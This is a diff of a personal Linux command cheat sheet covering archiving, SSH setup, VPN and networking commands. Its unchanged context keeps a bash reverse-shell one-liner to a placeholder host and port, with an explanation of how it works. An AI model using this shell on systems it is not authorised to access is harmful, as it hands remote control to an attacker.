@@ -238,12 +238,13 @@ Find out system uptime:           uptime (tells the current time, how long the s
 Change display settings:          xrandr (e.g. set brightness with '--output <screen_name> --brightness 0.5', get the screen name without args)
 
 Create tar file:                  tar czfp < output | - > <dir> (use - to send to stdout, z filters through gzip)
-Decompress tar file:              tar xzfp < file | - >
+Extract tar file:                 tar xzfp < file | - >
 Compress into gzip file:          gzip <file> (-c: to stdout)
 Decompress gzip files (gz):       gzip -d <file>
-Compress into zip file:           zip -r <output> <input> (-e: encrypt)
+Compress into zip file:           zip (-r: recursive) (-e: encrypt) (-9: best compression) <output> <input> 
 Decompress zip file:              unzip <file>
-Decompress multi-part files       7zip x [-p<pass>] <file>
+Create 7zip archive:              7z a <output> <input> (-mx=9: best compression) (output extension determines compression method)
+Decompress [multi-part] archives: 7zip x [-p<pass>] <file>
 
 Find diffs between files/dirs:    diff <file1> <file2>
 Check file checksum:              echo "<hash> <filename>" | {md5sum | sha1sum | sha256sum | sha512sum} -c -
@@ -288,7 +289,7 @@ Networking:
 Test host reachability:           ping <host> (either domain or IP address)
 Web browser:                      links2 <url>
 Connect to a VPN:                 sudo openvpn <vpn_key_file>
-SSH into a machine:               ssh <user>@<ip> (you'll be prompted for a pass; add '<command> >> <local_file>' to send output to local file)
+SSH into a machine:               ssh <user>@<ip>[:<port>] (you'll be prompted for a pass; add '<command> >> <local_file>' to send output to local file)
 Connect to ProtonVPN:             protonvpn-cli
 Get private IPs:                  ip -4 -o a | awk '{print $4}' 
 Get public IP:                    curl -sL ipinfo.io/ip
@@ -302,7 +303,19 @@ Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (re
 The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
 
 
-SSH with public-key authentication:
+
+Secure Shell (SSH):
+
+SSH (SSH client) is a program for logging into a remote machine and for executing commands on a remote machine. It is intended to provide secure encrypted communications between two untrusted hosts over an insecure network.  X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over the secure channel.
+
+- How to enable SSH:
+
+Install server:                     sudo apt-get install -y openssh-server
+Service status:                     sudo systemctl status ssh
+Firewall rule:                      sudo ufw allow ssh
+Reload & enable firewall on boot:   sudo ufw enable 
+
+- SSH with public-key authentication:
 
 It removes the need to enter a password every time you need to connect to a remote SSH host.
 We can create public/private key pairs to authenticate SSH connections with OpenSSH (apt-get install openssh-client -y).
